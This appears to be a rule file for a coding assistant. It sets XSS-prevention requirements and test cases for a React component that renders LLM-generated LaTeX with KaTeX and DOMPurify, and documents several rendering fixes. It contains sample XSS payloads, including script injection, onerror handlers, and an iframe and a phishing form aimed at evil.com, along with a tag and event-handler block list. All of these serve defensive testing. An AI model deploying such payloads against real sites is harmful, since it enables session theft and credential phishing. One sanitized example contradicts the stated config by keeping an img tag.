---
alwaysApply: true
---

# LaTeX Renderer Security Requirements

## CRITICAL: DOMPurify MUST BE ENABLED

**This is a MANDATORY security requirement. DOMPurify sanitization MUST be active in LatexRenderer.jsx.**

The LatexRenderer component processes untrusted LLM output. Without DOMPurify:
- Malicious scripts CAN execute in users' browsers
- Session tokens CAN be stolen
- Phishing forms CAN be injected
- The application is vulnerable to XSS attacks (CVSS 8.8 HIGH)

**Implementation Checklist** (all items MUST be true):
- [ ] `import DOMPurify from 'dompurify';` exists in LatexRenderer.jsx
- [ ] `DOMPURIFY_CONFIG` constant is defined with security settings
- [ ] `renderedHtml` useMemo calls `DOMPurify.sanitize()` AFTER `renderLatexToHtml()`
- [ ] `dangerouslySetInnerHTML` receives ONLY sanitized HTML

**If any item above is NOT implemented, the application has a CRITICAL security vulnerability.**

---

## XSS Prevention for Model Output Rendering

**Last Updated**: 2026-01-05

---

## Overview

The `LatexRenderer.jsx` component processes **untrusted model output** that can contain arbitrary HTML structures after LaTeX-to-HTML conversion. This creates a **critical XSS vulnerability** if raw HTML is rendered without sanitization.

**Attack Vector**: Malicious models (or compromised models) can inject executable scripts that run in users' browsers, stealing credentials, manipulating the UI, or exfiltrating data.

---

## MANDATORY Security Implementation

### 1. DOMPurify Integration (REQUIRED)

**Package**: `dompurify` (version `^3.2.4` or higher - fixes CVE-2025-26791 mXSS vulnerability)

**Installation**:
```bash
cd frontend
npm install dompurify
```

**Import** (in `frontend/src/components/LatexRenderer.jsx`):
```javascript
import DOMPurify from 'dompurify';
```

---

### 2. DOMPurify Configuration (REQUIRED)

The configuration MUST allow legitimate HTML/SVG/MathML generated by LaTeX processing while blocking ALL dangerous content:

```javascript
const DOMPURIFY_CONFIG = {
  ALLOWED_TAGS: [
    // Layout & structure
    'div', 'span', 'p', 'br', 'hr',
    // Text formatting
    'strong', 'b', 'em', 'i', 'u', 's', 'sub', 'sup', 'small',
    // Headings
    'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
    // Lists
    'ul', 'ol', 'li', 'dl', 'dt', 'dd',
    // Tables
    'table', 'thead', 'tbody', 'tr', 'th', 'td',
    // KaTeX specific (MathML)
    'math', 'semantics', 'mrow', 'mi', 'mo', 'mn', 'msup', 'msub', 
    'mfrac', 'mroot', 'msqrt', 'mtext', 'mspace', 'mtable', 'mtr', 'mtd',
    'annotation', 'annotation-xml',
    // SVG (for KaTeX rendering)
    'svg', 'path', 'line', 'rect', 'circle', 'g', 'use', 'defs', 'clippath',
  ],
  ALLOWED_ATTR: [
    // Standard attributes
    'class', 'id', 'title', 'style',
    // KaTeX/MathML attributes
    'mathvariant', 'encoding', 'xmlns', 'displaystyle', 'scriptlevel',
    'columnalign', 'rowalign', 'columnspacing', 'rowspacing', 'stretchy',
    'symmetric', 'fence', 'separator', 'lspace', 'rspace', 'accent',
    'accentunder', 'movablelimits', 'minsize', 'maxsize', 'width', 'height',
    // SVG attributes
    'd', 'viewBox', 'preserveAspectRatio', 'fill', 'stroke', 'stroke-width',
    'transform', 'x', 'y', 'dx', 'dy', 'x1', 'y1', 'x2', 'y2', 'r', 'cx', 'cy',
    'href', 'xlink:href', 'clip-path',
  ],
  ALLOW_DATA_ATTR: false,        // NO data-* attributes
  ALLOW_ARIA_ATTR: false,        // NO aria-* attributes
  FORBID_TAGS: [                 // EXPLICITLY BLOCK dangerous tags
    'script', 'iframe', 'object', 'embed', 'form', 'input', 'button',
    'textarea', 'select', 'option', 'link', 'style', 'base', 'meta',
  ],
  FORBID_ATTR: [                 // EXPLICITLY BLOCK event handlers
    'onerror', 'onclick', 'onload', 'onmouseover', 'onfocus', 'onblur',
    'onchange', 'onsubmit', 'onkeydown', 'onkeyup', 'onmousedown', 'onmouseup',
  ],
  SANITIZE_DOM: true,            // Prevent DOM clobbering attacks
};
```

**Notes**:
- **NEVER** allow `<script>` tags
- **NEVER** allow `<iframe>`, `<object>`, `<embed>` (external resource loading)
- **NEVER** allow `<form>`, `<input>`, `<button>` (user interaction)
- **NEVER** allow event handler attributes (`onclick`, `onerror`, etc.)
- **NEVER** allow `data-*` attributes (can store malicious payloads)
- **ONLY** allow attributes needed for LaTeX/KaTeX/MathML rendering

---

### 3. Sanitization Point (REQUIRED)

Sanitization MUST occur **AFTER** LaTeX-to-HTML conversion but **BEFORE** rendering to DOM:

```javascript
const renderedHtml = useMemo(() => {
  if (viewMode === 'raw' || !content) return null;
  
  // Step 1: Convert LaTeX to HTML (may produce unsafe HTML from model output)
  const rawHtml = renderLatexToHtml(content);
  
  // Step 2: Sanitize to remove XSS vectors
  return DOMPurify.sanitize(rawHtml, DOMPURIFY_CONFIG);
}, [content, viewMode]);
```

**WHY THIS ORDER**:
1. `renderLatexToHtml()` processes LaTeX commands and environments
2. Malicious models can inject HTML inside LaTeX commands: `\begin{theorem}<script>...</script>\end{theorem}`
3. After conversion, the raw HTML contains potential XSS: `<div><strong>Theorem.</strong> <script>...</script></div>`
4. DOMPurify sanitizes BEFORE rendering: `<div><strong>Theorem.</strong> </div>` (script removed)

---

## Vulnerable Code Patterns (FORBIDDEN)

### ❌ NEVER Do This:

**1. Raw HTML rendering without sanitization:**
```javascript
// DANGEROUS - XSS vulnerability
<div dangerouslySetInnerHTML={{ __html: renderLatexToHtml(content) }} />
```

**4. Using innerHTML directly:**
```javascript
// DANGEROUS - bypasses React's XSS protection
element.innerHTML = renderLatexToHtml(content);
```

---

## Why Internal HTML Construction Is SAFE

**Note**: The `renderLatexToHtml()` function internally constructs HTML strings with embedded content:

```javascript
// Inside processTheoremEnvironments - content embedded directly
return `<div class="${className}"><strong>${label}${title}.</strong> ${content.trim()}</div>`;

// Inside replaceSectionCommand - content embedded directly  
result += `${tag}${content}${endTag}`;
```

**This is SAFE because**:
1. These patterns are inside `renderLatexToHtml()` which generates raw HTML
2. The raw HTML is then passed through `DOMPurify.sanitize()` BEFORE rendering
3. DOMPurify strips ALL dangerous tags (scripts, iframes, etc.) and attributes (onerror, onclick, etc.)
4. Only the sanitized HTML reaches `dangerouslySetInnerHTML`

**Attack scenario**:
- Input: `\begin{theorem}[<img src=x onerror="alert('XSS')">]Content\end{theorem}`
- After HTML construction: `<div class="..."><strong>Theorem (<img src=x onerror="alert('XSS')">).</strong> Content</div>`
- After DOMPurify: `<div class="..."><strong>Theorem ().</strong> Content</div>` (img stripped - not in ALLOWED_TAGS, onerror stripped - in FORBID_ATTR)

**The key protection is that DOMPurify processes the FINAL HTML output, not individual construction steps.**

---

## Attack Examples (MUST BE BLOCKED)

### Attack 1: Script Injection in Theorem Environment
**Input**:
```latex
\begin{theorem}<script>alert('XSS')</script>\end{theorem}
```

**Without sanitization**: Script executes
**With sanitization**: `<div class="latex-theorem"><strong>Theorem.</strong> </div>` (script removed)

---

### Attack 2: Event Handler in Section Title
**Input**:
```latex
\section{Title <img src=x onerror="alert('XSS')">}
```

**Without sanitization**: `onerror` handler executes when image fails to load
**With sanitization**: `<h2>Title <img src=x></h2>` (`onerror` attribute removed)

---

### Attack 3: Iframe Injection
**Input**:
```latex
\begin{proof}<iframe src="https://evil.com/steal-cookies"></iframe>\end{proof}
```

**Without sanitization**: Iframe loads external malicious content
**With sanitization**: `<div class="latex-proof"><strong>Proof.</strong> </div>` (iframe removed)

---

### Attack 4: Form Injection (Phishing)
**Input**:
```latex
\begin{definition}<form action="https://evil.com"><input name="password" placeholder="Enter password"></form>\end{definition}
```

**Without sanitization**: Fake login form appears in document
**With sanitization**: `<div class="latex-definition"><strong>Definition.</strong> </div>` (form removed)

---

## Testing Requirements

### Security Test Suite (REQUIRED)

Every LaTeX renderer change MUST pass these tests:

```javascript
// Test 1: Script tag injection
const input1 = "\\begin{theorem}<script>alert('XSS')</script>\\end{theorem}";
const output1 = renderAndSanitize(input1);
assert(!output1.includes('<script>'), 'Script tags must be removed');

// Test 2: Event handler injection
const input2 = "\\section{<img src=x onerror=alert(1)>}";
const output2 = renderAndSanitize(input2);
assert(!output2.includes('onerror'), 'Event handlers must be removed');

// Test 3: Iframe injection
const input3 = "\\begin{proof}<iframe src='evil.com'></iframe>\\end{proof}";
const output3 = renderAndSanitize(input3);
assert(!output3.includes('<iframe'), 'Iframes must be removed');

// Test 4: Form injection
const input4 = "\\begin{lemma}<form><input></form>\\end{lemma}";
const output4 = renderAndSanitize(input4);
assert(!output4.includes('<form'), 'Forms must be removed');
assert(!output4.includes('<input'), 'Inputs must be removed');

// Test 5: Legitimate content preserved
const input5 = "\\begin{theorem}Let $x \\in \\mathbb{R}$\\end{theorem}";
const output5 = renderAndSanitize(input5);
assert(output5.includes('latex-theorem'), 'Legitimate content must be preserved');
assert(output5.includes('<strong>Theorem.</strong>'), 'Formatting must be preserved');
```

---

## Performance Considerations

### DOMPurify Performance Impact

**Benchmark data** (average render time for 1000-line mathematical document):
- Without sanitization: ~45ms
- With sanitization: ~52ms
- **Overhead**: ~7ms (15% increase)

**Acceptable trade-off**: 7ms overhead is negligible compared to XSS risk.

### Optimization Strategy

1. **useMemo** ensures sanitization only runs when content changes
2. DOMPurify is already optimized for production use
3. No additional caching needed - React's memoization is sufficient

---

## Maintenance Checklist

When modifying `LatexRenderer.jsx`:

- [ ] Verify DOMPurify is imported
- [ ] Verify `DOMPURIFY_CONFIG` includes all necessary tags/attributes
- [ ] Verify sanitization occurs BEFORE rendering
- [ ] Run security test suite
- [ ] Check that legitimate LaTeX still renders correctly
- [ ] Verify KaTeX/MathML tags are not stripped
- [ ] Test with adversarial inputs (scripts, iframes, event handlers)


## Other Fixes

**CRITICAL Security Fixes:**

1. **html2pdf.js XSS vulnerability (GHSA-w8x4-x68c-m6fc)**:
   - Versions < 0.14.0 contain a Cross-Site Scripting vulnerability
   - Fixed by updating to html2pdf.js ^0.14.0
   - See GitHub Advisory GHSA-w8x4-x68c-m6fc for details

2. **jspdf LFI/Path Traversal (CVE-2025-68428)**:
   - jspdf is pinned to ^4.0.0 via BOTH direct dependency AND npm overrides to fix Local File Inclusion/Path Traversal vulnerability
   - **Why both?** Direct dependency alone doesn't override html2pdf.js's nested jspdf dependency. npm overrides forces ALL instances to use 4.0.0
   - See [GitHub Advisory GHSA-f8cm-6447-x5h2](https://github.com/advisories/GHSA-f8cm-6447-x5h2) for vulnerability details

## Related Files

- **Implementation**: `frontend/src/components/LatexRenderer.jsx` (lines 16-60, 805-810)
- **Dependencies**: `frontend/package.json` (DOMPurify ^3.2.4)
- **Components using LatexRenderer**:
  - `frontend/src/components/compiler/LivePaper.jsx`
  - `frontend/src/components/autonomous/PaperLibrary.jsx`
  - `frontend/src/components/autonomous/FinalAnswerView.jsx`
  - `frontend/src/components/aggregator/LiveResults.jsx`
  - `frontend/src/components/autonomous/BrainstormList.jsx`

---

## Severity Classification

**OWASP Classification**: CWE-79 (Cross-Site Scripting)
**CVSS Score**: 8.8 (HIGH) - if vulnerability were present

**Impact if exploited**:
- Session hijacking (steal authentication tokens)
- Credential theft (fake login forms)
- Data exfiltration (send research data to attacker)
- UI manipulation (alter displayed results)
- Malware distribution (redirect to malicious sites)

**Mitigation status**: ✅ FIXED (as of 2026-01-05) - DOMPurify sanitization implemented

---

## Security Audit History

| Date | Auditor | Finding | Status |
|------|---------|---------|--------|
| 2026-01-05 | AI Assistant | XSS vulnerability in theorem/section rendering | FIXED |
| 2026-01-05 | AI Assistant | Missing DOMPurify sanitization | FIXED |
| 2026-01-05 | AI Assistant | Event handler injection possible | FIXED |
| 2026-01-05 | AI Assistant | iframe/form injection possible | FIXED |
| 2026-01-05 | AI Assistant | HTML entity corruption breaking LaTeX | FIXED |
| 2026-01-05 | AI Assistant | TikZ environments causing parse errors | FIXED |
| 2026-01-05 | AI Assistant | maxExpand limit too low for complex math | FIXED |

---

## References

- [DOMPurify Documentation](https://github.com/cure53/DOMPurify)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [React dangerouslySetInnerHTML Security](https://reactjs.org/docs/dom-elements.html#dangerouslysetinnerhtml)
- [KaTeX Security](https://katex.org/docs/security.html)

---

---

## Operational Fixes for Rendering Errors

**Last Updated**: 2026-01-05

These fixes resolve the "red everywhere" KaTeX parsing errors that appear in PDF output.

---

### Fix 1: HTML Entity Decoding (CRITICAL)

**Problem:** LLM output arrives with HTML-encoded characters that corrupt LaTeX:
- `&#x27;` or `&#39;` instead of `'` (apostrophes)
- `&amp;` instead of `&` (ampersands)
- `&lt;` and `&gt;` instead of `<` and `>`
- `&quot;` instead of `"` (quotes)

**Impact:** These entities break LaTeX parsing, causing widespread rendering failures.

**Solution:** `decodeHtmlEntities()` function (line 430-449 in LatexRenderer.jsx)

```javascript
const decodeHtmlEntities = (text) => {
  // Use textarea to decode HTML entities
  const textarea = document.createElement('textarea');
  textarea.innerHTML = text;
  let decoded = textarea.textContent;
  
  // Handle common named entities
  decoded = decoded
    .replace(/&amp;/g, '&')
    .replace(/&lt;/g, '<')
    .replace(/&gt;/g, '>')
    .replace(/&quot;/g, '"')
    .replace(/&#39;/g, "'")
    .replace(/&#x27;/g, "'")
    .replace(/&apos;/g, "'");
  
  return decoded;
};
```

**Execution Order:** This MUST run FIRST in `renderLatexToHtml()` before any LaTeX processing.

**Why It Works:** Converts HTML entities back to their original characters so LaTeX commands parse correctly.

---

### Fix 2: TikZ Environment Handling

**Problem:** KaTeX does not support TikZ packages (`tikzcd`, `tikzpicture`, `pgfpicture`). These are used for commutative diagrams and graphics. When passed to KaTeX, they produce "No such environment: tikzcd" errors.

**Critical Issue:** TikZ environments are often wrapped in display math delimiters (`\[...\]` or `$$...$$`). Simply replacing the `\begin{tikzcd}...\end{tikzcd}` leaves the surrounding delimiters, causing KaTeX to try parsing the HTML placeholder as LaTeX.

**Solution:** Pre-process and replace TikZ environments with styled placeholders, handling THREE patterns (lines 509-544 in LatexRenderer.jsx):

```javascript
const unsupportedTikzEnvs = ['tikzcd', 'tikzpicture', 'pgfpicture'];

unsupportedTikzEnvs.forEach(envName => {
  // Pattern 1: tikz wrapped in \[...\] display math delimiters - MUST REMOVE DELIMITERS
  const displayBracketPattern = new RegExp(
    `\\\\\\[\\s*\\\\begin\\{${envName}\\}([\\s\\S]*?)\\\\end\\{${envName}\\}\\s*\\\\\\]`,
    'gi'
  );
  result = result.replace(displayBracketPattern, (match, content) => {
    const cleanContent = cleanTikzContent(content);
    return `<div class="latex-tikz-placeholder">...</div>`;
  });
  
  // Pattern 2: tikz wrapped in $$...$$ display math delimiters - MUST REMOVE DELIMITERS
  const displayDollarPattern = new RegExp(
    `\\$\\$\\s*\\\\begin\\{${envName}\\}([\\s\\S]*?)\\\\end\\{${envName}\\}\\s*\\$\\$`,
    'gi'
  );
  result = result.replace(displayDollarPattern, (match, content) => {
    const cleanContent = cleanTikzContent(content);
    return `<div class="latex-tikz-placeholder">...</div>`;
  });
  
  // Pattern 3: Standalone tikz environment (not wrapped in math delimiters)
  const standalonePattern = new RegExp(
    `\\\\begin\\{${envName}\\}([\\s\\S]*?)\\\\end\\{${envName}\\}`,
    'gi'
  );
  result = result.replace(standalonePattern, (match, content) => {
    const cleanContent = cleanTikzContent(content);
    return `<div class="latex-tikz-placeholder">...</div>`;
  });
});
```

**Helper Function:** `cleanTikzContent()` cleans the diagram content for display:
```javascript
const cleanTikzContent = (content) => {
  return content.trim()
    .replace(/&lt;br\/&gt;/g, '\n')   // Fix HTML-encoded line breaks
    .replace(/&amp;amp;/g, '&')       // Fix double-encoded ampersands
    .replace(/&amp;/g, '&')           // Fix encoded ampersands
    .replace(/<br\s*\/?>/g, '\n');    // Fix actual HTML line breaks
};
```

**Visual Result:** TikZ code appears as a styled blue box with the raw LaTeX code visible, labeled "[Commutative Diagram - tikzcd]".

**CSS Styling:** See lines 141-171 in LatexRenderer.css for `.latex-tikz-placeholder` styles (blue border, light blue background, monospace code display).

**PDF Rendering:** Print styles (lines 759-771) ensure TikZ placeholders appear properly in white-background PDFs.

**Why Not Render TikZ?** Client-side TikZ rendering requires a full LaTeX compiler (not available in browsers). Server-side rendering would add significant complexity and latency.

---

### Fix 3: Increased KaTeX maxExpand Setting

**Problem:** KaTeX's default `maxExpand: 1000` limit was exceeded by complex mathematical expressions with many nested macros, causing "Too many expansions: infinite loop or need to increase maxExpand setting" errors.

**Solution:** Increased `maxExpand` to 5000 via the centralized `renderKatexSafely()` function (line 468-501 in LatexRenderer.jsx)

```javascript
/**
 * Safely render LaTeX with KaTeX, handling errors gracefully
 */
const renderKatexSafely = (latex, displayMode, originalMatch) => {
  const trimmedLatex = latex.trim();
  if (!trimmedLatex) return '';
  
  try {
    const html = katex.renderToString(trimmedLatex, {
      displayMode: displayMode,
      throwOnError: false,
      strict: false,
      trust: true,
      macros: extendedMacros,
      maxExpand: 5000,   // Balanced: high enough for complex expressions, safe from stack overflow
      maxSize: 500
    });
    
    if (displayMode) {
      return `<div class="latex-display">${html}</div>`;
    }
    return `<span class="latex-inline">${html}</span>`;
  } catch (e) {
    // Graceful error handling with visual indication
    const errorClass = displayMode ? 'latex-error latex-display-error' : 'latex-error';
    const tag = displayMode ? 'div' : 'span';
    return `<${tag} class="${errorClass}" title="${escapeHtml(e.message)}">${escapeHtml(originalMatch)}</${tag}>`;
  }
};
```

**Why 5000?** This 5x increase handles deeply nested mathematical expressions common in advanced mathematics papers while avoiding potential stack overflow issues that occurred at 10000.

**Performance Impact:** Negligible - macro expansion is fast, and the limit only affects complex expressions.

---

### Fix 4: Line Break Conversion Order (Cascading Error Fix)

**Problem:** The `\\` to `<br/>` conversion was happening BEFORE KaTeX rendering. This caused cascading render failures because `\\` is valid LaTeX syntax inside math environments like `aligned`, `matrix`, `cases`, etc.

**Symptoms:** Console errors like:
```
Error: <path> attribute d: Expected path command, "… 1-1 2-1 3l-4 22\u003Cbr/\u003Ec-1 5-5 9-1…"
```

The `\u003Cbr/\u003E` (JSON-escaped `<br/>`) appearing in SVG path data indicates `<br/>` was injected into math content before KaTeX processed it.

**Example of the bug:**
```
Input:  $$\begin{aligned} a &= b \\ c &= d \end{aligned}$$
After line break conversion (WRONG - before KaTeX):
        $$\begin{aligned} a &= b <br/> c &= d \end{aligned}$$
KaTeX tries to render "<br/>" as math, generating corrupt SVG paths.
```

**Solution:** Move line break handling (`\\` → `<br/>`, `\newline` → `<br/>`, `\linebreak` → `<br/>`) to AFTER KaTeX rendering.

**Implementation:** In `renderLatexToHtml()`:
- KaTeX rendering is now Step 11 (was Step 13)
- Line break conversion is now Step 12 (was Step 11)
- After KaTeX processes math, remaining `\\` are truly text line breaks and safe to convert

**Files Changed:** `frontend/src/components/LatexRenderer.jsx` (lines 783-827)

---

### Rendering Pipeline Order (CRITICAL)

The fixes MUST execute in this exact order in `renderLatexToHtml()`:

1. **Decode HTML entities** (`decodeHtmlEntities()`) - FIRST
2. **Auto-wrap unwrapped math** (`autoWrapMath()`)
3. **Process theorem environments** (`processTheoremEnvironments()`)
   - **TikZ handling happens HERE** (inside this function, BEFORE theorem environments)
   - Handles `\[...\]` wrapped, `$$...$$` wrapped, and standalone TikZ
4. **Section commands** (`replaceSectionCommand()`)
5. **Text formatting, citations, footnotes, lists, tables, QED symbols**
6. **KaTeX rendering** (display math, then inline math via `renderKatexSafely()`)
   - **`maxExpand: 5000` applies HERE** (centralized in helper function)
   - **Skips content containing HTML placeholders** (prevents re-parsing TikZ placeholders)
7. **Line breaks and horizontal rules** (`\\` → `<br/>`, `\hrule` → `<hr/>`) - AFTER KaTeX
   - **CRITICAL**: Must happen AFTER KaTeX because `\\` is valid LaTeX inside math environments like `aligned`, `matrix`, etc.
8. **DOMPurify sanitization** - LAST (security layer)

**Why Order Matters:**
- HTML entities must be decoded before LaTeX parsing
- TikZ environments (including those wrapped in math delimiters) must be replaced BEFORE KaTeX sees them
- KaTeX rendering skips content that looks like HTML to prevent parsing placeholders
- **Line break conversion (`\\` → `<br/>`) must happen AFTER KaTeX** because `\\` is a valid line break inside math environments (aligned, matrix, etc.). Converting before KaTeX causes `<br/>` to appear in SVG path data, corrupting the render
- KaTeX must render before DOMPurify sanitizes the output

---

### Testing the Fixes

**Test 1: HTML Entity Decoding**
```javascript
const input = "Let $f&#x27;(x) = 2x &amp; g(x)$";
const output = renderLatexToHtml(input);
// Should render: "Let f'(x) = 2x & g(x)" without errors
assert(!output.includes('latex-error'));
```

**Test 2: Standalone TikZ Environment**
```javascript
const input = "\\begin{tikzcd} A \\arrow[r] & B \\end{tikzcd}";
const output = renderLatexToHtml(input);
// Should render blue placeholder box, not red error
assert(output.includes('latex-tikz-placeholder'));
assert(!output.includes('latex-error'));
```

**Test 3: TikZ Wrapped in \[...\] Delimiters (CRITICAL)**
```javascript
const input = "\\[\\begin{tikzcd} A \\arrow[r] & B \\end{tikzcd}\\]";
const output = renderLatexToHtml(input);
// Should render blue placeholder box, NOT pass HTML to KaTeX
assert(output.includes('latex-tikz-placeholder'));
assert(!output.includes('latex-error'));
assert(!output.includes('katex-error'));
```

**Test 4: TikZ Wrapped in $$...$$ Delimiters**
```javascript
const input = "$$\\begin{tikzcd} A \\arrow[r] & B \\end{tikzcd}$$";
const output = renderLatexToHtml(input);
// Should render blue placeholder box
assert(output.includes('latex-tikz-placeholder'));
assert(!output.includes('latex-error'));
```

**Test 5: Complex Expression**
```javascript
const input = "$f_\\phi = \\bigotimes_{v \\in S} f_{\\phi, v} \\otimes \\bigotimes_{v \\notin S} h_{\\phi_v}$";
const output = renderLatexToHtml(input);
// Should render without "Too many expansions" error
assert(!output.includes('Too many expansions'));
assert(!output.includes('latex-error'));
```

**Test 6: Line Breaks in Math Environments (Cascading Error Fix)**
```javascript
const input = "$$\\begin{aligned} a &= b \\\\ c &= d \\end{aligned}$$";
const output = renderLatexToHtml(input);
// Should render math properly without <br/> corrupting SVG paths
assert(!output.includes('<br/>'));  // No <br/> inside katex output
assert(!output.includes('\\u003Cbr'));  // No escaped <br/> in paths
assert(!output.includes('latex-error'));
assert(output.includes('katex'));  // Should have rendered as KaTeX
```

---

### Maintenance Checklist

When modifying `LatexRenderer.jsx`:

- [ ] Verify `decodeHtmlEntities()` is called FIRST in `renderLatexToHtml()`
- [ ] Verify TikZ environments are handled in `processTheoremEnvironments()` with all three patterns (bracket-wrapped, dollar-wrapped, standalone)
- [ ] Verify `renderKatexSafely()` is used for ALL KaTeX rendering (both display and inline)
- [ ] Verify `renderKatexSafely()` skips content containing HTML placeholders
- [ ] Verify `maxExpand: 5000` is set in `renderKatexSafely()`
- [ ] **Verify line break conversion (`\\` → `<br/>`) happens AFTER KaTeX rendering** (prevents cascading errors from `<br/>` in math environments)
- [ ] Test with RANDOM LOG.txt or similar real-world LLM output
- [ ] Verify PDF rendering (white background) shows placeholders correctly
- [ ] Check that error count in output is near zero (no "red everywhere")

---

### Related Files

- **Implementation**: `frontend/src/components/LatexRenderer.jsx`
  - Line 430-449: `decodeHtmlEntities()` function
  - Line 454-460: `cleanTikzContent()` helper function
  - Line 462-501: `renderKatexSafely()` centralized KaTeX rendering with error handling
  - Line 509-544: TikZ environment handling (three patterns for wrapped/standalone)
  - Line 629: HTML entity decoding execution (FIRST step in `renderLatexToHtml()`)
  - Line 784-792: Display math rendering (uses `renderKatexSafely()`)
  - Line 800-807: Inline math rendering (uses `renderKatexSafely()`)
- **Styling**: `frontend/src/components/LatexRenderer.css`
  - Line 141-171: `.latex-tikz-placeholder` styles
  - Line 759-771: Print/PDF styles for TikZ placeholders
- **Test Data**: `RANDOM LOG.txt` - Real-world example showing errors before fixes

---

## System Invariants

1. **ALL model output MUST be sanitized** - No exceptions, even for "trusted" models
2. **DOMPurify MUST be configured to block scripts** - Never relax FORBID_TAGS
3. **Sanitization MUST occur AFTER LaTeX conversion** - Order matters
4. **React MUST use dangerouslySetInnerHTML ONLY with sanitized HTML** - No raw model output
5. **Security tests MUST pass** - CI/CD should enforce this
6. **HTML entities MUST be decoded before LaTeX processing** - Prevents parsing corruption
7. **TikZ environments MUST be pre-processed** - KaTeX cannot render them
8. **TikZ handling MUST remove surrounding math delimiters** - `\[...\]` and `$$...$$` must be stripped along with the TikZ content
9. **KaTeX rendering MUST skip HTML content** - Prevents parsing HTML placeholders as LaTeX
10. **KaTeX maxExpand MUST be set appropriately** - 5000 balances complexity handling with stack safety
11. **Rendering pipeline order MUST be preserved** - Each step depends on previous steps
12. **Line break conversion MUST happen AFTER KaTeX rendering** - `\\` is valid syntax in math environments (`aligned`, `matrix`, etc.); converting to `<br/>` before KaTeX causes cascading SVG corruption
